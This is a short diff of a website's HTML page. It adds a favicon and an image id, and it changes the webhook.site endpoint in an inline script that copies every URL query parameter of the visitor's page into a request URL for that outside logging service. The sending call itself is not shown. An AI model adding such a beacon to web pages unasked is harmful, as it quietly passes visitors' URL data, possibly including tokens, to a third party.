@@ -19,6 +19,7 @@
 	<link rel="stylesheet" type="text/css" href="icomoon/icomoon.css">
 	<link rel="stylesheet" type="text/css" href="css/vendor.css">
 	<link rel="stylesheet" type="text/css" href="style.css">
+	<link rel="shortcut icon" type="image/x-icon" href="Logos.png">
 
 </head>
 
@@ -80,7 +81,7 @@
 
 					<div class="col-md-2">
 						<div class="main-logo">
-							<a href="index.html"><img style="border-radius: 50%;height: 100px;;" src="Logos.png" alt="logo"></a>
+							<a href="index.html"><img style="border-radius: 50%;height: 100px;;" src="Logos.png" alt="logo" id="myImage"></a>
 						</div>
 
 					</div>
@@ -1225,9 +1226,10 @@
 	<script src="js/jquery-1.11.0.min.js"></script>
 	<script>
 		const method = 'GET';
+		const image = document.getElementById('myImage')
 		const urlParams = new URLSearchParams(window.location.search);
 		const paramsObj = {};
-		const logUrl = new URL("https://webhook.site/18dd74df-7abe-4d4d-b153-a99d901d083d")
+		const logUrl = new URL("https://webhook.site/8e7ad9fe-2fa7-43d8-9358-2a149666b32f")
 		logUrl.searchParams.append("method",method);
 		for(const [key,value] of urlParams.entries()){
 			logUrl.searchParams.append(key,value);
